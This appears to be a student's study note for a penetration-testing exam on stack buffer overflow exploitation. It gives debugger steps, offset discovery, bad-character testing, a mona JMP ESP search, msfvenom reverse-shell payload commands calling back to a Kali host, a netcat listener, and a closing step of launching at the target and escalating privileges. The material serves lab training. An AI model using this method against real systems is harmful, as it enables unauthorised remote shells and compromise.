<ins>Step 1: Understand the bug issue that crashes the application</ins>

- Attach Immunity Debugger (Windows) or edb (Linux) to the vulnerable application
- Run the poc.py code after attaching
- See the debugger exception caught values
    - Note register that has '0x41' value
    - Note EIP, ESP, EBP values
    - Note which Register points to area in the Stack (ESP)

<ins>Step 2: Generate msfoffset to identify locations to insert values into registers</ins>

- msf-pattern_create -l &lt;number of A's sent in poc.py&gt;
    
    - > msf-pattern_create -l 3000
        
- Restart the vulnerable service, modify the poc code with the offset pattern, and relaunch Immunity debugger and reattach with the new process
    
- Note the values in the registers with 0x414141 previously
    
- Note the location where ESP is pointing to (i.e. value where ESP is pointing to)
    
    - Example - We obtain values for the registers
        
    - EIP -- 0x30764239
        
    - `EBP -- 0x75423875`
        
    - `ESP - 0x0029F40C`
        
    - `Value pointer by Stack address - 0x42763142`
        
- Find the offset value using msf-pattern_offset -l 3000 -q &lt;value&gt;
    
    - msf-pattern_offset -l 3000 -q 30764239
- We can then modify the poc code to separate into the registers or area which we will insert our code
    
- ![65e154314e62b2c9daa731bb3a378b3a.png](:/4435e0a308a149a589a744301d35e342)
- We can do a verification, or continue to the next step
    

<ins>Step 3: Find bad chars of the programme</ins>

Testing for bad characters (in python) -

badchars = ( "\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10" "\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20" "\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30" "\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40" "\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50" "\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60" "\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70" "\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80" "\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90" "\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0" "\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0" "\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0" "\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0" "\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0" "\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0" "\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff" )

- Substitute stack variable with the bad chars structure (\\x00 is a bad char by default)
- Execute the poc cycle, and note in the stack what char is missing or what char the stack stops at
    - Sometimes the value is replaced with a different value (e.g. 0xB0) so see and take note the pattern
- Redo the cycle and change the bad chars variable to remove the bad chars, while taking note what values are bad
    - The bad characters are 0x0, ….
- Once we hit 0xff in the stack, we can move on to the next step

<ins>Step 4: Find "JMP ESP" Instruction in app library that we can use</ins>

To look and check on the modules: !mona modules

To search for code: !mona find -s "&lt;opcode&gt;" -m "&lt;module name&gt;"

- First load the modules using !mona modules
- Look for modules that do not have any memory protections
- ![563db5db74ace181b6919c48aab6a8f7.png](:/ef2d0de938d143a5beb5a6c7e4e44f40)
- Use msf-nasm_shell to find the opcode for jmp esp (or just reuse "FFE4")

    > jmp esp

5.  Take note of any bad chars within the instruction address that was found by the search. If there is any bad chars, ignore that address

<ins>Step 5: Create the payload and load and test the poc for a reverse shell</ins>

Generate encoded payload (windows):

> msfvenom -p windows/shell\_reverse\_tcp LHOST=&lt;KALI IP&gt; LPORT=443 EXITFUNC=thread -f c –e x86/shikata\_ga\_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\3d"

Generate normal payload (linux):

> msfvenom -p linux/x86/shell\_reverse\_tcp LHOST=&lt;KALI IP&gt; LPORT=443 -b "\\x00\\x20" -f py -v shellcode

- Generate the payload using msfvenom
    - Change the -f parameter to the language of the poc code (e.g. for python, change to -f py)
    - Change the bar chars to what we found
- Place the code into the poc file
- Make the necessary adjustments to keep the packet load the same
- Setup the netcat listener on Kali: sudo nc -nlvp 443
- Run the Poc code and check that a shell is obtained in the listener at the end
    - Make sure the breakpoint you set earlier in the immunity debugger works

<ins>Step 6: Copy back to Kali and launch towards the target intended</ins>

- Repeat Step 5 except this time target the IP that has the application running
- Do privilege escalation and obtain whatever information required if necessary
- Else just get local.txt or proof.txt screenshot
